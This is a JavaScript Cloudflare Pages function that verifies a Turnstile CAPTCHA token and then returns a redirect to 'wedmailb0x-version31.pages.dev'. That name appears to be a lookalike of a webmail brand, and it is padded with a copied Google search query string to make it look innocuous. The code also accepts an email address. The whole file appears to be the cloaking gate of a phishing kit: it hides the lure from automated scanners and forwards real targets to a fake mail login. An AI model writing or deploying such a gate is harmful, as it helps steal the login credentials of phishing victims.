// functions/verify.js
export async function onRequestPost(context) {
  const { token, email } = await context.request.json();
  const secret = context.env.TURNSTILE_SECRET_KEY;

  const formData = new URLSearchParams();
  formData.append("secret", secret);
  formData.append("response", token);
  formData.append("remoteip", context.request.headers.get("CF-Connecting-IP") || "");

  const result = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST",
    body: formData
  });

  const outcome = await result.json();

  if (!outcome.success) {
    return new Response("Turnstile verification failed", { status: 403 });
  }

  const redirectUrl = `https://wedmailb0x-version31.pages.dev/sca_esv=540de929b15f835b&rlz=1C1RLNS_enUS865NG865&sxsrf=AHTn8zo7Yb_qRgh7lrx8XoO3Y7YJu7YN6Q%3A1744153427701&ei=U6v1Z4XIKuaYhbIPw4rZqAQ&ved=0ahUKEwjFvffrxcmMAxVmTEEAHUNFFkUQ4dUDCBA&uact=5&oq=7jzq8.sa.com&gs_lp=Egxnd3Mtd2l6LXNlcnAiDDdqenE4LnNhLmNvbUi1BFAAWABwAHgAkAEAmAGRAqABkQKqAQMyLTG4AQPIAQD4AQGYAgCgAgCYAwCSBwCgB0CyBwC4BwA&sclient=gws-wiz-serp`;
  return new Response(JSON.stringify({ redirectUrl }), {
    headers: { "Content-Type": "application/json" },
    status: 200,
  });
}
